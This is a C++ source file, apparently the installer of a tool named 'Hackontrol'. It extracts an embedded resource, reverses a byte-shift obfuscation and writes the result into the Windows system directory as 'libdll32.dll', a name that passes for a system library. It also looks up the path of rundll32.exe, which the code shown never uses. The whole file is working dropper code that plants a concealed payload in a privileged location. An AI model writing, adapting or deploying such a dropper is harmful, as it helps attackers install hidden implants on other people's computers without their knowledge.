#include <stdio.h>
#include <string>
#include <Windows.h>
#include "HackontrolInstaller.h"
#include "resource.h"

#define FILE_NAME L"libdll32.dll"

int main(int argc, char** argv) {
	printf("Getting System Directory\n");
	wchar_t* filePath = HI_GetSystemDirectory(FILE_NAME);
	printf("Getting rundll32.exe Directory\n");
	wchar_t* rundll32 = HI_GetSystemDirectory(L"rundll32.exe");
	printf("Getting DLL Resource\n");
	HRSRC resourceHandle = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(resourceHandle == NULL) {
		HI_FormatError(GetLastError(), "FindResourceW()");
		return -1;
	}

	printf("Getting Resource Size\n");
	DWORD size = SizeofResource(NULL, resourceHandle);

	if(size == NULL) {
		HI_FormatError(GetLastError(), "SizeofResource()");
		return -1;
	}

	printf("Resource Size: %d Bytes\n", size);
	printf("Loading Resource\n");
	HGLOBAL resource = LoadResource(NULL, resourceHandle);

	if(resource == NULL) {
		HI_FormatError(GetLastError(), "LoadResource()");
		return -1;
	}

	printf("Locking Resource\n");
	BYTE* data = static_cast<BYTE*>(LockResource(resource));

	if(data == NULL) {
		HI_FormatError(GetLastError(), "LockResource()");
		return -1;
	}

	printf("Allocate Memory for Offsetting\n");
	BYTE* offsetted = static_cast<BYTE*>(malloc(size * sizeof(BYTE)));

	if(offsetted == NULL) {
		HI_FormatError(ERROR_NOT_ENOUGH_MEMORY, "malloc()");
		return -1;
	}

	printf("Offsetting Bytes\n");

	for(DWORD i = 0; i < size; i++) {
		offsetted[i] = (data[i] - 18) % 0xFF;
	}

	printf("Creating/Opening File\n");
	HANDLE file = CreateFileW(filePath, GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(file == INVALID_HANDLE_VALUE) {
		HI_FormatError(GetLastError(), "CreateFileW()");
		return -1;
	}

	DWORD written = 0;
	printf("Writing File\n");

	if(WriteFile(file, offsetted, size, &written, NULL) == NULL) {
		HI_FormatError(GetLastError(), "WriteFile()");
		return -1;
	}

	printf("Total Size: %d\nBytes Written: %d\n", size, written);
	printf("Closing File\n");

	if(CloseHandle(file) == NULL) {
		HI_FormatError(GetLastError(), "CloseHandle()");
		return -1;
	}

	return 0;
}
